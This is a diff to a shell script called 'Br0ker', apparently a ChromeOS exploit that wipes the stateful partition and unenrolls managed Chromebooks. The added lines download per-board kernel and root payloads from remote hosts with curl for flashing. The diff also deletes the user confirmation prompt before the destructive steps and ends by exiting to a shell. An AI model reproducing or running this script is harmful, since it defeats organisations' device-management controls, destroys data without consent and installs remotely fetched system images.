@@ -9,9 +9,8 @@ SCRIPT_DIR=${SCRIPT_DIR:-"."}
 set -eE
 
 SCRIPT_DATE="[2025-08-03]"
-PAYLOAD_DIR=/mnt/sh1mmer/mounted_payloads
+PAYLOAD_DIR=/br0ker
 RECOVERY_KEY_LIST="$SCRIPT_DIR"/short_recovery_keys.txt
-
 MNT=
 TMPFILE=
 
@@ -105,6 +104,7 @@ if [ -f /etc/lsb-release ]; then
 	BOARD="${BOARD#*=}"
 	BOARD="${BOARD%-signed-*}"
 else
+    curl -LO https://raw.githubusercontent.com/MercuryWorkshop/sh1mmer/beautifulworld/wax/payloads/short_recovery_keys.txt
 	[ -f "$RECOVERY_KEY_LIST" ] || fail "Missing recovery key list!"
 	TMPFILE=$(mktemp)
 	flashrom -i GBB -r "$TMPFILE" >/dev/null 2>&1
@@ -145,6 +145,7 @@ fi
 
 clear
 echo "Welcome to Br0ker."
+echo "DOWNGRADE TO 132!  THERE WILL BE ISSUES IF NOT"
 echo "Script date: ${SCRIPT_DATE}"
 echo ""
 echo "This will destroy all data on ${TARGET_STATEFUL} and unenroll the device."
@@ -154,13 +155,6 @@ echo "- Changing the device's serial number"
 echo "- Changing the device's secret"
 echo "- Other temporary bypasses, check the \"Avoiding accidental re-enrollment\" thread in TN for more info."
 echo "Note that this exploit is expected to be fully patched soon."
-echo "Continue? (y/N)"
-read -r action
-case "$action" in
-	[yY]) : ;;
-	*) fail "Abort." ;;
-esac
-
 MNT=$(mktemp -d)
 USE_KERN=
 
@@ -179,9 +173,22 @@ for i in 3 5; do
 done
 
 if [ -z "$USE_KERN" ]; then
+    directory="/br0ker"
+	kernroothost="https://nightly.link/crosbreaker/sh1mmer/actions/runs/18078469427/$BOARD"
+	echo "Debug: $kernroothost"
+	echo "Starting br0ker payload download ($BOARD)"
+	mkdir "$directory"
+ 	cd "$directory"
+	echo "Downloading root. THIS WILL TAKE TIME!  THIS IS LIKELY NOT FROZEN"
+	curl --progress-bar -LO ""$kernroothost"_root.gz.zip" || fail "root.gz failed to download"
+	echo "Downloading kern"
+	curl -LO ""$kernroothost"_kern.gz.zip" || fail "kern.gz failed to download"
+	unzip ""$BOARD"_root.gz.zip" || fail "failed to unzip root.gz.zip"
+	unzip ""$BOARD"_kern.gz.zip" || fail "failed to unzip kern.gz.zip"
+	cd /
 	[ -d "$PAYLOAD_DIR" ] || fail "Missing mounted payload directory! Ensure the USB drive/SD card is still plugged in!"
-	KERN_PAYLOAD="$PAYLOAD_DIR/updates/16093/$BOARD"/kern.gz
-	ROOT_PAYLOAD="$PAYLOAD_DIR/updates/16093/$BOARD"/root.gz
+	KERN_PAYLOAD="$PAYLOAD_DIR/kern.gz"
+	ROOT_PAYLOAD="$PAYLOAD_DIR/root.gz"
 	[ -f "$KERN_PAYLOAD" ] || fail "Required payload '$KERN_PAYLOAD' not found! Is this image built with the correct payload for Br0ker?"
 	[ -f "$ROOT_PAYLOAD" ] || fail "Required payload '$ROOT_PAYLOAD' not found! Is this image built with the correct payload for Br0ker?"
 
@@ -233,8 +240,7 @@ crossystem disable_dev_request=1 || :
 crossystem disable_dev_request=1 # grunt weirdness
 crossystem block_devmode=1 || :
 crossystem block_devmode=1
-
-echo "Finished! Press enter to reboot."
-read -rs
-reboot -f
-sleep infinity
+echo "Cleaning up payload dir..."
+rm -rf /br0ker
+echo "Finished! dropping shell"
+exit
